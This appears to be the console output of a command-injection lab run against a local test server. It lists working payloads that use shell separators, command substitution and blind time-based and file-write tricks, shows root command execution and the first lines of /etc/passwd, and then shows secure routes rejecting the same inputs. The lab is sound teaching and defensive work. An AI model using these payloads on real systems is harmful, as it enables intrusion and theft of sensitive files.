@@ -1,0 +1,85 @@
+Running all command injection attacks against http://127.0.0.1:5001
+
+======================================================================
+  ATTACK 1: Command separators
+======================================================================
+Goal   : run a second command of my choice after the intended one.
+The shell treats each of these as a boundary between commands.
+----------------------------------------------------------------------
+  semicolon ;  payload='localhost; id'
+               -> uid=0(root) gid=0(root) groups=0(root)   (run id regardless)
+  and &&       payload='localhost && whoami'
+               -> root   (run whoami if lookup ok)
+  or ||        payload='nope.invalid || id'
+               -> uid=0(root) gid=0(root) groups=0(root)   (run id because lookup failed)
+  pipe |       payload='localhost | id'
+               -> uid=0(root) gid=0(root) groups=0(root)   (pipe into id, which ignores input)
+  newline      payload='localhost\nid'
+               -> uid=0(root) gid=0(root) groups=0(root)   (newline also ends a command)
+
+======================================================================
+  ATTACK 2: Command substitution
+======================================================================
+Goal   : run a command using $( ) or backticks, with NO separator
+         like ; or && at all. This slips past any filter that only
+         blocks the separators. The inner command runs first.
+Here the inner result is swallowed by the lookup, so I prove the
+inner command ran by its side effects: a delay, then a written file.
+----------------------------------------------------------------------
+  payload 'localhost$(sleep 3)' responded in 3.02s  -> the inner sleep ran
+  payload 'localhost`id > /tmp/cmdi_sub.txt`' created the file:
+      uid=0(root) gid=0(root) groups=0(root)
+
+======================================================================
+  ATTACK 3: Reading a sensitive file
+======================================================================
+Goal   : prove this is full code execution by dumping /etc/passwd.
+----------------------------------------------------------------------
+Payload: 'localhost; head -n 3 /etc/passwd'
+First lines of /etc/passwd returned by the app:
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+======================================================================
+  ATTACK 4: Blind injection, time based (backup)
+======================================================================
+Goal   : the backup tool shows no command output. Prove code runs by
+         making it pause, and reading the answer off the clock.
+----------------------------------------------------------------------
+  payload '. ; sleep 1' responded in 1.02s
+  payload '. ; sleep 5' responded in 5.02s
+  the 4.0s gap proves the injected sleep ran, even though
+  the page said only 'Backup complete'.
+
+======================================================================
+  ATTACK 5: Blind injection, writing output to a file (backup)
+======================================================================
+Goal   : no output on the page, so redirect an injected command's
+         output into a file, then retrieve it another way.
+----------------------------------------------------------------------
+Payload: '. ; id > /tmp/cmdi_proof.txt'
+Contents of the file the injected command created:
+    uid=0(root) gid=0(root) groups=0(root)
+A real attacker would redirect this into the web folder or send
+it out over the network instead of a local file.
+
+======================================================================
+  ATTACK 6: Same payloads against the secure routes
+======================================================================
+The secure routes validate input and run commands with no shell.
+----------------------------------------------------------------------
+  secure /lookup  payload='localhost; id'          -> Invalid host. Rejected.
+  secure /lookup  payload='localhost$(id)'         -> Invalid host. Rejected.
+  secure /lookup  payload='localhost`whoami`'      -> Invalid host. Rejected.
+  secure /lookup  payload='localhost && whoami'    -> Invalid host. Rejected.
+  secure /backup  payload='. ; sleep 5'            -> Invalid label. Rejected.  (0.00s)
+  secure /backup  payload='. ; id > /tmp/cmdi_proof.txt' -> Invalid label. Rejected.  (0.01s)
+
+No command ran, no delay, nothing leaked. The input was treated as a
+single argument and the allowlist rejected the bad characters too.
+
+----------------------------------------------------------------------
+Done. Out of band injection (making the server call out to an
+attacker controlled server) is explained in the report but not run
+here, since it needs outbound network access to a server we control.
